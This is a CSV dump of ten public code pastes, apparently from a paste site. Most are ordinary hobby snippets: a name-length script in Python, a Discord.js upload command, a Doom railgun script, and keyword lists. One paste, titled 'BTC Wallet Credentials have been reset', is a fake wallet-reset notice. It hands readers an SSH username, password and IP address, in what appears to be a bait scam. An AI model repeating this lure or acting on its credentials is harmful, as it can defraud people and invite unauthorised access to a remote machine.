id,title,username,language,date,content
cb4QS035,Untitled,xX_yodaplayzXx,Python,Friday 16th of June 2023 01:01:41 PM CDT,"import random,time
list_of_names = ['Amelia', 'Olivia', 'Isla', 'Emily', 'Alexey', 'Poppy', 'Ava', 'Isabella', 'Jessica', 'Marcus', 'Lily', 'Sophie', 'Grace', 'Vsevolod', 'Sophia', 'Mia', 'Evie', 'Ruby', 'Celim', 'Sumir', 'Ella', 'Scarlett', 'Ruben', 'Isabelle', 'Chloe', 'Cherlin', 'Sienna', 'Masha', 'Freya', 'Phoebe', 'Charlotte', 'Daisy', 'Alice', 'Florence', 'Eva', 'Sofia', 'Millie', 'Lucy', 'Evelyn', 'Elsie', 'Rosie', 'Imogen', 'Lola', 'Matilda', 'Elizabeth', 'Layla', 'Alasdair','Holly', 'Lilly', 'Molly', 'Erin', 'Ellie', 'Maisie', 'Maya', 'Abigail', 'Eliza', 'Georgia', 'Jasmine', 'Esme', 'Willow', 'Leanne', 'Bella', 'Annabelle', 'Keemiya', 'Ivy', 'Amber', 'Emilia', 'Emma', 'Summer', 'Hannah', 'Eleanor', 'Harriet', 'Rose', 'Amelie', 'Lexi', 'Megan', 'Gracie', 'Zara', 'Nuha', 'John', 'Lacey', 'Martha', 'Anna', 'Violet', 'Darcey', 'Maria', 'Maryam', 'Brooke', 'Aisha', 'Katie', 'Leah', 'Heinrich', 'Nour', 'Thea', 'Darcie', 'Hollie', 'Amy', 'Alexandra', 'Stephen', 'Jonathan', 'Penny', 'Mollie', 'Heidi', 'Lottie', 'Bethany', 'Francesca', 'Faith', 'Harper', 'Nancy', 'Beatrice', 'Isabel', 'Juliette', 'Darcy', 'Lydia', 'Sarah', 'Sara', 'Julia', 'Victoria', 'Zoe', 'Robyn', 'Oliver', 'Jack', 'Harry', 'Jacob', 'Charlie', 'Thomas', 'Annabel', 'George', 'Oscar', 'James', 'Ian', 'William', 'Noah', 'Alfie', 'Joshua', 'Yuvraj', 'Muhammad', 'Leo', 'Archie', 'Ethan', 'Joseph', 'Arushi', 'Freddie', 'Samuel', 'Alexander', 'Logan', 'Daniel', 'Isaac', 'Max', 'Mohammed', 'Benjamin', 'Hugo', 'Mason', 'Lucas', 'Edward', 'Harrison', 'Jake', 'Neil', 'Dylan', 'Asher', 'Riley', 'Akash', 'Finley', 'Catherine', 'Theo', 'Muktarsi', 'Sebastian', 'Adam', 'Zachary', 'Arthur', 'Thomas', 'Alberto', 'Toby', 'Jayden', 'Luke', 'Harley', 'Lewis', 'Tyler', 'Harvey', 'Anusha', 'Matthew', 'David', 'Reuben', 'Alok', 'Michael', 'Elijah', 'Kian', 'Tom', 'Mohammad', 'Blake', 'Jean', 'Luca', 'Theodore', 'Stanley', 'Derin', 'Jenson', 'Nathan', 'Nicholas', 'Charles', 'Frankie', 'Constantin', 'Jude', 'Teddy', 'Eric', 'Viren', 'Louie', 'Louis', 'Ryan', 'Hugo', 'Bobby', 'Niamh', 'Anya', 'Elliott', 'Dexter', 'Khai', 'Hariesh', 'Henry', 'Ollie', 'Aron', 'Alex', 'Liam', 'Kai', 'Gabriel', 'Connor', 'Aaron', 'Afrah', 'Frederick', 'Callum', 'Lorcan', 'Elliot', 'Albert', 'Leon', 'Ronnie', 'Rory', 'Jamie', 'Austin', 'Seth', 'Ibrahim', 'Mei', 'Owen', 'Caleb', 'Yousuf', 'Ellis', 'Sonny', 'Devyn', 'Robert', 'Joey', 'Felix', 'Finlay', 'Rossa', 'Ekraj', 'Jackson', 'Jimi', 'Meera', 'Rafi', 'Salahdeen', 'Guido', 'Tanya', 'Karlis']


new_list = []
max = 0
print(""The highest was..."")
time.sleep(1)

for loop in list_of_names:                   # Words with the highest number of letters
  if len(loop)> max:
    max = len(loop)                                   
    new_list.append(loop)

print(new_list[-1])
print(""This has "" + str(max)+ "" letters"")
print("""")
time.sleep(0.5)
other_new_list = []
print(""The lowest was..."")
time.sleep(1)
for loop in list_of_names:                   # Words with the lowest number of letters
  if len(loop)< max:
    max = len(loop)
    new_list.append(loop)

print(new_list[-1])
print(""This has "" + str(max)+ "" letters"")


                                          # Names spelt the same backwards








"
MwFpEcUN,something,theguild42,C++,Friday 16th of June 2023 12:50:43 PM CDT,"#include <iostream>
using namespace std;

#include ""wp.h""
int main(){
    wp_init();
    cout << ""WirePlumber Initalized!"" << endl;
    return 0;
}"
EH6mgyee,kb_act.lst,ht777,C,Friday 16th of June 2023 12:48:09 PM CDT,"""blank""				""==========================""
""blank""				""Addon""
""blank""				""==========================""

""KickingComm""        ""Patada""
""+smh_menu""          ""Menu de tercera persona""
""dropweapon""         ""Lanzar arma""
""thirdperson_toggle"" ""Activar/desactivar tercera persona""
""rm_ragdolize""       ""Dejarse caer"""
WnCByA9n,BTC Wallet Credentials have been reset,abbredescr_91,GetText,Friday 16th of June 2023 12:35:58 PM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials will be 
avsetabn:Ztdz4V on 45.9.148.244(SSH)
Regards"
HvnNeqQt,"Baixar video Youtube (sem janela, apenas terminal)",MizunoBrasil,Python,Friday 16th of June 2023 12:15:46 PM CDT,"#Baixar video Youtube (sem janela, apenas terminal)

from pytube import YouTube

# Solicita ao usuário que insira o URL do vídeo
url = input(""Insira o URL do vídeo do YouTube: "")

try:
    # Cria uma instância do objeto YouTube
    video = YouTube(url)

    # Filtra a melhor resolução disponível
    stream = video.streams.get_highest_resolution()

    # Baixa o vídeo
    print(""Baixando o vídeo..."")
    stream.download()
    print(""Download concluído!"")

except Exception as e:
    print(""Ocorreu um erro durante o download:"", str(e))
"
yx8VZhHH,Example,ClownProgrammer,Java,Friday 16th of June 2023 12:14:00 PM CDT,"public static List<String> splitText(String text, int maxSizeLine) {
        ArrayList<String> result = new ArrayList<>();

        Pattern pattern = Pattern.compile(""(\\S{0,""+maxSizeLine+""}\\s?)"");
        Matcher matcher = pattern.matcher(text);
        StringBuilder testString = new StringBuilder();
        while (matcher.find()) {
            if (testString.length() < maxSizeLine) {
                testString.append(matcher.group());
            }
            else {
                result.add(testString.toString());
                testString = new StringBuilder(matcher.group());
            }
        }
        result.add(testString.toString());

        return result;
    }"
51wgg8ac,upload.js Discord.js v14 JS Command,LightAndy197,JavaScript,Friday 16th of June 2023 12:13:23 PM CDT,"/**
 * ❗Dependencies (npm):
 *   - discord.js (obviously);
 *   - shefin-tinyurl (for link shortening);
 *   - colors (for coloured error log);
 *
 * ❗You can use this to install them quick: `npm i discord.js shefin-tinyurl colors`
 */

const { SlashCommandBuilder, EmbedBuilder } = require(""discord.js"");
const TinyURL = require(""shefin-tinyurl"");
require(""colors"");

module.exports = {
  data: new SlashCommandBuilder()
    .setName(""upload"")
    .setDescription(""Upload a file and receive a shortened URL link."")
    .addAttachmentOption((option) =>
      option
        .setName(""file"")
        .setDescription(""The file to upload."")
        .setRequired(true)
    )
    .addBooleanOption((option) =>
      option
        .setName(""shorten-link"")
        .setDescription(""True = Shortened Link; False = Old, long link"")
        .setRequired(false)
    )
    .addBooleanOption((option) =>
      option
        .setName(""public"")
        .setDescription(
          ""True = Public Message; False = Private Message (ephemeral)""
        )
        .setRequired(false)
    ),
  async execute(interaction) {
    const { options, user } = interaction;

    const file = options.getAttachment(""file"");
    const smallFile = await TinyURL.shorten(file.url);
    const shorten = options.getBoolean(""shorten-link"");
    const public = options.getBoolean(""public"");

    //* Embeds
    const embed = new EmbedBuilder()
      .setColor(0x00ac60)
      .setAuthor({
        name: ""Upload complete!"",
        iconURL: ""https://i.imgur.com/W9GJJRK.jpg"",
      })
      .setFooter({
        text: `Requested by ${user.tag}`,
        iconURL: user.displayAvatarURL({ dynamic: true }),
      })
      .setTimestamp();
    const errEmbed = new EmbedBuilder()
      .setColor(""Red"")
      .setAuthor({
        name: ""Something went wrong..."",
        iconURL: ""https://i.imgur.com/k1x9dS3.png"",
      })
      .setDescription(
        ""Your file might be too large. Upload a smaller file and try again later. If the issue persists please contact the developer.""
      )
      .setTimestamp();

    try {
      if (shorten == false)
        embed.setDescription(
          `Here's a link to your uploaded file: ${file.url}`
        );
      else
        embed.setDescription(
          `Here's a shortened link to your uploaded file: ${smallFile}`
        );

      if (public == true) {
        return await interaction.reply({ embeds: [embed] });
      } else {
        return await interaction.reply({ embeds: [embed], ephemeral: true });
      }
    } catch (err) {
      console.log(""[UPLOAD ERROR]"".red, err);
      return await interaction.reply({ embeds: [errEmbed], ephemeral: true });
    }
  },
};

/**
 * ❗Code by LightAndy#0001 (Actual Discord tag as 06.16.2023) or @LightAndy (New possible Discord tag)
 * ❗I would like to have credits for the code please, if you want to use it
 */
"
KcjrdBAS,Railgun rails spawning in segments,Tomasm21,C++,Friday 16th of June 2023 11:31:18 AM CDT,"#library ""SW""
#include ""zcommon.acs""
#include ""zdaemon.acs""

Script 1024 (int lowang){

int i;
int LoWangTID;

if(lowang == 0){

    int x = 0;
    int y = 0;
    int z = 0;
	int xb, yb, zb;
	int railTID = 46000+Various_tags[9];
    Various_tags[9] = Various_tags[9] + 1;    
    if (Various_tags[9] > 999) Various_tags[9] = 0;
	
	thing_changetid(0, railTID);
 
    setactivatortotarget(0);  
	LoWangTID = activatorTID();

	for(i = 0; i < 32; i++){
		if(playerLoWangClone[i] == LoWangTID){
			break;
		}
	}
	
	setactorangle(railTID,getactorangle(0));
	
	xb = getactorx(railTID) + cos (getactorangle(0)-0.25) * 4;
	yb = getactory(railTID) + sin (getactorangle(0)-0.25) * 4;
	zb = getactorz(railTID);
	
    setactorposition(railTID, xb, yb, zb, 0);
	
	setactivator(railTID);
	for(int j = 0; j < 2; j++){
		activatorsound(""RAILGF2"",255);
	}

    int this = 0;
    while (thingcount(T_NONE,railTID) == 1)
    {
        x = getactorx(railTID);
        y = getactory(railTID);
        z = getactorz(railTID);
		
        if(this > 0){
			if(this == 1){
				spawnprojectile(0,""KeySwamp"",getactorangle(0)>>8,0,0,0,LoWangTID+i*5 + 34003);
				spawnprojectile(0,""FlameLarge"",getactorangle(railTID)>>8,64,0,0,LoWangTID+i*5 + 35003);
				Thing_SetTranslation (LoWangTID+i*5 + 34003, 192);
				spawnprojectile(0,""KeySwamp"",getactorangle(0)>>8,0,0,0,LoWangTID+i*5 + 34004);
				spawnprojectile(0,""FlameLarge"",getactorangle(railTID)>>8,64,0,0,LoWangTID+i*5 + 35004);
				Thing_SetTranslation (LoWangTID+i*5 + 34004, 191);
				spawnprojectile(0,""KeySwamp"",getactorangle(0)>>8,0,0,0,LoWangTID+i*5 + 34005);
				spawnprojectile(0,""FlameLarge"",getactorangle(railTID)>>8,64,0,0,LoWangTID+i*5 + 35005);
				Thing_SetTranslation (LoWangTID+i*5 + 34005, 190);
			}
			spawnprojectile(0,""KeySwamp"",getactorangle(0)>>8,0,0,0,LoWangTID+i*5 + 34001);
			spawnprojectile(0,""FlameLarge"",getactorangle(railTID)>>8,64,0,0,LoWangTID+i*5 + 35001);
 			spawnprojectile(0,""KeySwamp"",getactorangle(0)>>8,0,0,0,LoWangTID+i*5 + 34002);
 			spawnprojectile(0,""FlameLarge"",getactorangle(railTID)>>8,64,0,0,LoWangTID+i*5 + 35002);
		}
		
        spawnprojectile(0,""KeySwamp"",getactorangle(0)>>8,0,0,0,LoWangTID+i*5 + 34000);
        spawnprojectile(0,""FlameLarge"",getactorangle(railTID)>>8,64,0,0,LoWangTID+i*5 + 35000);
		Thing_SetTranslation (LoWangTID+i*5 + 34000, 192);
        setactorposition(LoWangTID+i*5 + 34000,x,y,z,0);
		setactorposition(LoWangTID+i*5 + 35000,x,y,z,0);
		thing_changetid(LoWangTID+i*5 + 34000, 0);
		thing_changetid(LoWangTID+i*5 + 35000, 0);
			
		if(this > 0){
			if(this == 1){
				// External prtitioning: m:n = 1:2
				x = (x-2*xb)/-1;
				y = (y-2*yb)/-1;
				z = (z-2*zb)/-1;
				setactorposition(LoWangTID+i*5 + 34003, x, y, z,0);
				setactorposition(LoWangTID+i*5 + 35003, x, y, z,0);
				thing_changetid(LoWangTID+i*5 + 34003, 0);
				thing_changetid(LoWangTID+i*5 + 35003, 0);
				
				x = getactorx(railTID);
			    y = getactory(railTID);
			    z = getactorz(railTID);
				
				// External prtitioning: m:n = 2:5
				x = (2*x-5*xb)/-3;
				y = (2*y-5*yb)/-3;
				z = (2*z-5*zb)/-3;
				setactorposition(LoWangTID+i*5 + 34004, x, y, z,0);
				setactorposition(LoWangTID+i*5 + 35004, x, y, z,0);
				thing_changetid(LoWangTID+i*5 + 34004, 0);
				thing_changetid(LoWangTID+i*5 + 35004, 0);
				
				x = getactorx(railTID);
				y = getactory(railTID);
				z = getactorz(railTID);
				
				// External prtitioning: m:n = 1:4
				x = (x-4*xb)/-3;
				y = (y-4*yb)/-3;
				z = (z-4*zb)/-3;
				setactorposition(LoWangTID+i*5 + 34005, x, y, z,0);
				setactorposition(LoWangTID+i*5 + 35005, x, y, z,0);
				thing_changetid(LoWangTID+i*5 + 34005, 0);
				thing_changetid(LoWangTID+i*5 + 35005, 0);
				
				x = getactorx(railTID);
				y = getactory(railTID);
				z = getactorz(railTID);
			}
			
			// m:n = 1:2
			x = (x+2*xb)/3;
			y = (y+2*yb)/3;
			z = (z+2*zb)/3;
			
			setactorposition(LoWangTID+i*5 + 34001, x, y, z,0);
			setactorposition(LoWangTID+i*5 + 35001, x, y, z,0);
			thing_changetid(LoWangTID+i*5 + 34001, 0);
			thing_changetid(LoWangTID+i*5 + 35001, 0);
			
			x = getactorx(railTID);
			y = getactory(railTID);
			z = getactorz(railTID);
	
			// m:n = 2:1
			x = (2*x + xb)/3;
			y = (2*y + yb)/3;
			z = (2*z + zb)/3;
			setactorposition(LoWangTID+i*5 + 34002, x, y, z,0);
			setactorposition(LoWangTID+i*5 + 35002, x, y, z,0);
			thing_changetid(LoWangTID+i*5 + 34002, 0);
			thing_changetid(LoWangTID+i*5 + 35002, 0);
		}
		
 		xb = getactorx(railTID); yb = getactory(railTID); zb = getactorz(railTID);
        delay(1);
		
		this++;
    }
}
//..."
U9zmW5gV,euphoria syntax,LockdateforGHS,Euphoria,Friday 16th of June 2023 11:29:59 AM CDT,"and by constant do else elsif end exit for function global if include not or procedure return then to type while with without xor abort and_bits append arctan atom c_func call c_proc call_func call_proc clear_screen close compare command_line cos date equal find find_from floor getc getenv gets get_key get_pixel integer length log machine_func machine_proc match match_from mem_copy mem_set not_bits object open or_bits peek peek4s peek4u pixel platform poke poke4 position power prepend print printf profile puts rand remainder repeat routine_id sequence sin sprintf sqrt system system_exec tan task_clock_stop task_clock_start task_create task_list task_schedule task_self task_status task_suspend task_yield time trace xor_bits
-- exist"
fEeL0dWn,GetText Syntax Highlighting Keywords,LockdateforGHS,GetText,Friday 16th of June 2023 11:24:15 AM CDT,"Hey everybody, after research i found out pastebin uses GeShi software to highlight. I went to the gettext.php file then looked at all the keywords heres all of them since like no one knows the syntax

# Comment

msgctxt
msgid_plural
msgstr
msgid
'' """" () {} [] 



heres one i thought existed :(

Msgbox"
